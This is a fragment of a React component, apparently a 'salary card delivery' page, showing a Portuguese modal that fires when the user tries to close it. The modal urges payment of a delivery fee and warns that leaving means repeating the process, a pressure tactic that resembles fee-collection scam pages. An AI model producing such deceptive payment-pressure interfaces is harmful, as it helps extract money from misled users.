      {/* Modal de aviso ao tentar fechar */}
      <Dialog open={showCloseWarning} onOpenChange={setShowCloseWarning}>
        <DialogContent className="sm:max-w-md p-6 flex flex-col gap-4">
          <div className="flex items-center justify-center text-[#E83D22] mb-2">
            <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <circle cx="12" cy="12" r="10"></circle>
              <line x1="12" y1="8" x2="12" y2="12"></line>
              <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
          </div>
          
          <DialogTitle className="text-center text-base text-[#E83D22]">Atenção!</DialogTitle>
          
          <div className="text-center space-y-2">
            <p className="text-sm text-gray-800 font-medium">
              Seu cartão salário ainda não foi solicitado pois falta apenas o pagamento da taxa de entrega.
            </p>
            <p className="text-sm text-gray-700">
              Se você não realizar o pagamento agora, terá que repetir todo o processo novamente.
            </p>
          </div>
          
          <Button 
            onClick={() => setShowCloseWarning(false)}
            className="mt-4 bg-[#E83D22] hover:bg-[#d73920] py-2 text-white font-medium shadow-lg transform active:translate-y-0.5 transition-transform rounded-none"
            style={{ 
              boxShadow: "0 4px 0 0 #c23218",
              border: "none"
            }}
          >
            OK, entendi
          </Button>
        </DialogContent>
      </Dialog>
      
      <Footer />
    </div>
  );
};

export default EntregaCartao;